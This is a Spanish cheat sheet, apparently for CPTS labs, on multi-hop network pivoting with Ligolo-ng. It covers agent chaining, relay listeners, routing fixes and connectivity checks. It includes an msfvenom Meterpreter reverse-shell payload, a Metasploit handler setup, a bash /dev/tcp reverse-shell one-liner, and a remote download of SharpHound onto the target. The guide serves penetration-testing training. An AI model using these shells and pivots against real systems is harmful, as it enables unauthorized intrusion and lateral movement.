---
tags:
  - pivoting
---
> Para CPTS / labs. Pensado para doble y triple pivote con tráfico **full-duplex** (ida y vuelta).

---

## 0. Convención de nombres — LEER PRIMERO

Cada pivote es una máquina **dual-homed** (tiene 2 o más interfaces de red). Por eso es un pivote: toca dos redes a la vez.

Cuando algo tiene que "ir hacia adentro" (un agente nuevo o una shell que vuelve), **siempre apunta a la IP del pivote que está en la red del host que la lanza**, NO a la IP de Kali ni a la IP de la interfaz `ligolo`.

|Placeholder|Qué es|
|---|---|
|`<KALI>`|IP de tu Kali. Solo la usa el **primer** agente (Pivote1), que sí te alcanza directo.|
|`<PIVOTE1>`|IP de M1 **vista desde la red de M2** (su interfaz "hacia adentro").|
|`<PIVOTE2>`|IP de M2 **vista desde la red de M3** (su interfaz "hacia adentro").|
|`<PIVOTE3>`|IP de M3 vista desde su red más profunda (si hay un 4º salto).|

**Topología de referencia:**

```
Kali ──► PIVOTE1 (M1/DMZ) ──► PIVOTE2 (M2) ──► PIVOTE3 (M3) ──► objetivo
         tun: ligolo          tun: ligolo2      tun: ligolo3
```

Regla de oro: **una interfaz TUN por cada agente.** No existe "una interfaz para dos pivotes". Sí puedes meter varias rutas en UNA interfaz, pero solo si esas subredes cuelgan del MISMO agente.

---

## 1. MAPA DE PUERTOS (lo más importante para no liarla)

|Para qué|Escucha en|Puerto|Notas|
|---|---|---|---|
|**Proxy/daemon de Ligolo**|Kali|`11601`|Los agentes conectan aquí (directo o reenviados). No lo reutilices para nada más.|
|**Listener de encadenado** (para el siguiente agente)|en cada pivote|`11601`|Permite que el agente más profundo alcance al proxy.|
|**Handler de shell**|Kali|`4444`|Tu `nc` / Metasploit espera aquí en `0.0.0.0:4444`.|
|**Listener de shell** (relay)|en el pivote más cercano al objetivo|`4444`|El payload del objetivo apunta a la IP de ESE pivote, puerto `4444`.|
|**Servidor HTTP** (subir tools)|Kali|`8080`|`python3 -m http.server 8080`.|
|**Listener HTTP** (relay)|en el pivote más cercano al objetivo|`8080`|El objetivo descarga desde la IP de ese pivote.|

### Cómo leer `listener_add` (clave)

```
listener_add --addr 0.0.0.0:PUERTO_A --to 127.0.0.1:PUERTO_B --tcp
```

- `--addr 0.0.0.0:PUERTO_A` → el puerto **en el PIVOTE**. Es lo que marca el host profundo.
- `--to 127.0.0.1:PUERTO_B` → el destino **relativo a KALI**. El `127.0.0.1` es el localhost de Kali (donde espera tu proxy / handler / servidor).

Lo normal es usar el mismo número en los dos lados (`4444`→`4444`), pero recuerda que son dos extremos distintos.

---

## 2. Arranque del proxy (en Kali)

```bash
./proxy -selfcert
```

> `-selfcert` genera un certificado al vuelo (perfecto para labs). En el agente añade `-ignore-cert`.

---

## 3. Pivote simple (1 salto): Kali → Pivote1

**En Pivote1** (M1 alcanza a Kali directo):

```bash
./agent -connect <KALI>:11601 -ignore-cert
```

**En la consola de Ligolo:**

```text
session            # elige la sesión 1 (Pivote1)
autoroute          # crea la interfaz 'ligolo', detecta redes, añade rutas y arranca el túnel
```

Equivalente manual (útil para entender la mecánica)

```text
interface_create --name ligolo
session                                  # elige Pivote1
ifconfig                                 # mira las redes internas
route_add --name ligolo --route <RED_INTERNA>/24
tunnel_start --tun ligolo
```

En Kali, si lo haces manual: `sudo ip route add <RED_INTERNA>/24 dev ligolo`

Ya puedes alcanzar la red interna de M1 directamente (nmap, smb, etc.) **sin proxychains**.

---

## 4. Doble pivote: + Pivote2

**1) En la consola, sobre la sesión de Pivote1, abre el listener de encadenado:**

```text
session                                              # elige Pivote1
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

**2) Sube el agente a Pivote2 y conéctalo a la IP interna de Pivote1:**

```bash
./agent -connect <PIVOTE1>:11601 -ignore-cert
```

**3) En la consola, entra a la nueva sesión y crea la SEGUNDA interfaz:**

```text
session            # elige la sesión 2 (Pivote2)
autoroute          # crea 'ligolo2', rutas y túnel automáticamente
```

> El `--to 127.0.0.1:11601` siempre apunta al proxy. Ligolo hace que el tráfico vuelva atravesando la cadena por sí solo. No tienes que calcular puertos raros.

---

## 5. Triple pivote: + Pivote3

Mismo patrón, un escalón más:

```text
session                                              # elige Pivote2
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

```bash
# en Pivote3
./agent -connect <PIVOTE2>:11601 -ignore-cert
```

```text
session            # elige la sesión 3 (Pivote3)
autoroute          # crea 'ligolo3'
```

---

## 6. SHELLS INVERSAS a través de pivotes (CRÍTICO)

**Regla de oro:** el `LHOST` del payload = la IP del **último pivote antes del objetivo** (el que está en la red del objetivo). El listener de relay va en ESE mismo pivote. Solo **uno**: Ligolo se encarga del resto de la cadena automáticamente vía los túneles de los agentes.

|Saltos hasta el objetivo|`LHOST` del payload|Listener en|Comando del listener|
|---|---|---|---|
|0 (directo)|`<KALI>`|—|handler directo en Kali|
|1 (`→P1→objetivo`)|`<PIVOTE1>`|Pivote1|`listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp`|
|2 (`→P1→P2→objetivo`)|`<PIVOTE2>`|Pivote2|`listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp`|
|3 (`→P1→P2→P3→objetivo`)|`<PIVOTE3>`|Pivote3|`listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp`|

### Ejemplo completo (objetivo detrás de 2 pivotes)

**1) Generas el payload** apuntando a Pivote2:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<PIVOTE2> LPORT=4444 -f exe -o shell.exe
```

**2) Listener de relay en Pivote2** (en su sesión de Ligolo):

```text
session            # elige Pivote2
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

**3) Handler en Kali** (escucha en localhost, ahí cae la shell reenviada):

```text
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```

**Recorrido de la shell:** objetivo → `<PIVOTE2>:4444` → (relay por el túnel de P2 → P1 → Kali) → `127.0.0.1:4444` en Kali. ✅

> Lo mismo aplica a un `nc` o a una shell de Linux: `bash -i >& /dev/tcp/<PIVOTE2>/4444 0>&1`.

---

## 7. Transferencia de archivos (SharpHound → BloodHound)

El túnel es **full-duplex**: una vez levantado tienes ruta IP completa, ida y vuelta. La clave es **quién inicia** la conexión.

### A) TÚ inicias (descargar / exfiltrar DE un objetivo) → SIN listener

Simplemente te conectas tú al objetivo a través del túnel:

```bash
# bajar el zip de SharpHound que ya generaste en el objetivo
smbclient //<IP_OBJETIVO>/C$ -U 'usuario%pass' -c 'get loot.zip'
# o impacket, o conectarte a su HTTP/SMB normalmente
```

Esto NO necesita listener porque la conexión la abres tú desde Kali.

### B) El OBJETIVO inicia (que descargue una tool de tu Kali) → CON listener

**Servidor en Kali:**

```bash
python3 -m http.server 8080
```

**Listener en el pivote más cercano al objetivo** (ej. Pivote2):

```text
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080 --tcp
```

**En el objetivo (PowerShell):**

```powershell
iwr http://<PIVOTE2>:8080/SharpHound.exe -OutFile SharpHound.exe
```

> Resumen mental: **descargar = tú inicias = sin listener. Que algo te llame de vuelta (shell o `iwr` hacia ti) = listener en el pivote más cercano.**

---

## 8. Comandos de consola más usados

|Comando|Qué hace|
|---|---|
|`session`|Cambia entre agentes / entra a una sesión|
|`autoroute`|Crea interfaz + rutas + túnel automáticamente (lo más rápido)|
|`ifconfig`|Muestra las redes internas del agente seleccionado|
|`interface_create --name <nombre>`|Crea una interfaz TUN manualmente|
|`interface_list` / `iflist`|Lista interfaces|
|`route_add --name <iface> --route <red>/24`|Añade una ruta a una interfaz|
|`route_list`|Lista rutas|
|`tunnel_start --tun <iface>`|Arranca el túnel sobre esa interfaz|
|`listener_add --addr 0.0.0.0:A --to 127.0.0.1:B --tcp`|Crea un relay (encadenado, shells, HTTP)|
|`listener_list`|Lista listeners activos|
|`listener_stop <id>`|Elimina un listener|
|`help`|Ayuda|

---

## 9. EL ERROR QUE TE PASÓ (y cómo evitarlo)

> _"Desde la máquina 3 quería hablar con mi Kali (dos pivotes). Con la IP de la interfaz de Kali no agarraba, pero con la IP del Pivote2 sí."_

**Eso es el comportamiento correcto.** La máquina profunda **no tiene ruta hacia tu Kali**: está aislada, solo conoce su propia red. Solo puede mandar tráfico a un host que SÍ alcanza, que es el pivote vecino (Pivote2). Por eso:

- ❌ La IP real de Kali → no es enrutable desde la red profunda.
- ❌ La IP de la interfaz `ligolo` de Kali → solo existe en el lado de Kali, tampoco es enrutable desde allí.
- ✅ La IP de **Pivote2** (su interfaz hacia la red profunda) → ahí pones el listener que reenvía a Kali. Esa es la única que el host profundo puede tocar.

La dirección Kali → objetivo va sola por el túnel. La dirección objetivo → Kali **siempre** pasa por la IP del pivote más cercano con un listener.

### Otros fallos típicos

- **Te olvidaste del `tunnel_start`** (o de `autoroute`). Sin túnel arrancado, la ruta no transporta nada.
- **Ruta en la interfaz equivocada.** Cada subred va a la interfaz del agente que la toca (`ligolo` / `ligolo2` / `ligolo3`).
- **Modo manual sin `sudo`** al hacer `ip route add` o `ip tuntap` en Kali.
- **Falta `-ignore-cert`** en el agente cuando el proxy va con `-selfcert`.
- **Confundir los extremos del listener:** `--addr` es el puerto en el PIVOTE; `--to 127.0.0.1` es el puerto en KALI.
- Si un comando falla a la primera por la red, **reinténtalo** — a veces el primer paquete se pierde.

---

## 10. Rutas solapadas (overlapping routes) — el fallo del `/16` que tapa al `/24`

**Síntoma:** el agente está conectado, la interfaz aparece en `iflist`, pero al objetivo de la subred profunda **no llega nada** (100% packet loss, RDP/nmap sin respuesta).

**Causa:** dos interfaces TUN reclaman rutas que se **solapan**. Pasa muchísimo porque `autoroute` toma la IP de la NIC de Windows tal cual viene (p.ej. `172.16.6.35` con máscara `255.255.0.0`) y crea una ruta `/16` gigante. Si un pivote anterior ya tenía `172.16.0.0/16`, ahora hay dos rutas que cubren el mismo rango y el kernel manda el tráfico por la **interfaz equivocada** (la activa / la primera), que sale por un pivote sin salida a esa red.

**Ejemplo real (de un `iflist`):**

```
# TAP NAME   DST ROUTES                                STATE
1 pivot2     fe80::/64, 172.16.6.35/16                 Active - 1 / Pending - 1
2 pivote1    172.16.0.0/16, fe80::/64, 172.16.5.15/16  Active - 2 / Pending - 1
```

`172.16.6.35` cae dentro del `172.16.0.0/16` de `pivote1` → todo se va por `pivote1` y se pierde. Y encima la ruta de `pivot2` está en `Pending`: ni siquiera está activa.

### Diagnóstico

```text
iflist        # ¿dos interfaces con rutas que se solapan en el mismo /16?
```

En Kali, `ip route` te confirma por qué interfaz saldría realmente el tráfico a esa IP.

### El fix: ruta más específica (longest-prefix-match)

Una ruta `/24` **siempre gana** a un `/16` que la contenga, da igual el orden. Añade el `/24` exacto en la interfaz del pivote que SÍ toca esa red:

```text
session                                        # elige el pivote correcto (el que tiene la NIC en 172.16.6.x)
route_add --name pivot2 --route 172.16.6.0/24
tunnel_start --tun pivot2                       # activa la ruta (estaba en Pending)
iflist                                          # verifica: el /24 queda Active
```

Resultado: `172.16.6.0/24` sale por `pivot2`, y el resto del `172.16.0.0/16` sigue por `pivote1`. ✅

> Si el solapamiento persiste, limpia la interfaz y déjala solo con el `/24`:
> 
```text
tunnel_stop --tun pivot2
route_add --name pivot2 --route 172.16.6.0/24
tunnel_start --tun pivot2
```

> En Kali (manual): `sudo ip route del 172.16.0.0/16 dev pivot2` para borrar la ruta solapada.

### Cómo evitarlo de raíz

- Tras `autoroute`, **revisa siempre las máscaras con `iflist`.** Windows reporta `255.255.0.0` (`/16`) aunque la red real sea un `/24`.
- En entornos con varias subredes `172.16.x` o `10.x`, mejor `route_add` manual con el `/24` correcto que tragarte el `/16` que adivina `autoroute`.

---

## 11. Verificar conectividad a través de pivotes — NO te fíes del `ping`

El `ping` te miente constantemente en pivoting. Dos motivos:

1. **Windows bloquea ICMP por defecto** en su firewall. La ruta puede estar perfecta y el ping a un host Windows falla igual.
2. **Pingear la IP de la propia interfaz del pivote** (la 2ª NIC del agente, p.ej. `172.16.6.35`) a través de su propio túnel es un caso raro que Ligolo no siempre responde. No significa que la red profunda esté caída.

**Testea con el puerto que te importa**, no con ICMP:

```bash
# descubrir el objetivo real por puerto (sin ping), p.ej. RDP:
nmap -Pn -p3389 172.16.6.0/24

# RDP al objetivo (que normalmente NO es la IP del pivote):
xfreerdp /v:<IP_OBJETIVO> /u:<usuario> /p:'<pass>' /cert:ignore +clipboard /dynamic-resolution
```

> `-Pn` es **obligatorio** a través del túnel: le dice a nmap que asuma el host vivo y no haga ping primero (que fallaría y descartaría el host).

> Recuerda: la IP de la **interfaz del pivote** (`.35` en el ejemplo) es la propia máquina pivote. Tu objetivo de RDP casi siempre es **otra** IP de esa `/24` — sácala con el `nmap -Pn`.